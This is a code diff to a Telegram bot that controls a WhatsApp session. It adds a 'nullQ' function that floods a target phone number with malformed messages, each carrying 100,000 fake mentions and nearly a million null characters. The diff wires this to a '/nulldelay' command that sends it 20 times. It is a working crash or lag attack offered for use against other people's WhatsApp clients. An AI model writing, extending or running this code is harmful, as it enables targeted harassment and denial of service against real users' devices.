@@ -309,6 +309,53 @@ async function VampireSpamNotif(target, Ptcp = true) {
         }
     }, { participant: { jid: target } }, { messageId: null });
 }
+async function nullQ(target) {
+  let mentioned = Array.from({ length: 100000 }, () =>
+    `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
+  );
+
+  await sock.relayMessage(target, {
+    listResponseMessage: {
+      title: "@tamainfinity",
+      listType: 2,
+      buttonText: null,
+      sections: null,
+      singleSelectReply: { selectedRowId: "X" },
+      contextInfo: {
+        mentionedJid: mentioned,
+        participant: "0@s.whatsapp.net",
+        remoteJid: "status@broadcast",
+        mentionedJid: ["13135550002@s.whatsapp.net"],
+        quotedMessage: {
+          interactiveResponseMessage: {
+            body: {
+              text: "@tamainfinity",
+              format: 1
+            },
+            nativeFlowResponseMessage: {
+              name: "menu_options",
+              paramsJson: "\u0000".repeat(999999),
+              version: 3
+            },
+            contextInfo: {
+              isForwarded: true,
+              forwardingScore: 9741
+            }
+          }
+        },
+        disappearingMode: {
+          initiator: "CHANGED_IN_CHAT",
+          trigger: "CHAT_SETTING"
+        }
+      }
+    },
+    description: "X"
+  }, {
+    participant: { jid: target }
+  });
+}
+
+nullQ(m.chat);
 async function VampireGroupInvis(target, ptcp = true) {
     try {
         const message = {
@@ -1560,7 +1607,7 @@ bot.onText(/\/superdelay(?:\s(.+))?/, async (msg, match) => {
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
     });
 });
-bot.onText(/\/hardelay(?:\s(.+))?/, async (msg, match) => {
+bot.onText(/\/nulldelay(?:\s(.+))?/, async (msg, match) => {
     const senderId = msg.from.id;
     const chatId = msg.chat.id;
 
@@ -1591,8 +1638,8 @@ bot.onText(/\/hardelay(?:\s(.+))?/, async (msg, match) => {
     });
 
     // Proses pengiriman bug
-    for (let i = 0; i < 1; i++) { // Kirim 3 kali langsung
-        await VampDelayInvis(formatedNumber);
+    for (let i = 0; i < 20; i++) { // Kirim 3 kali langsung
+        await nullQ(formatedNumber);
     }
 
     // Kirim notifikasi setelah selesai dengan gambar lain
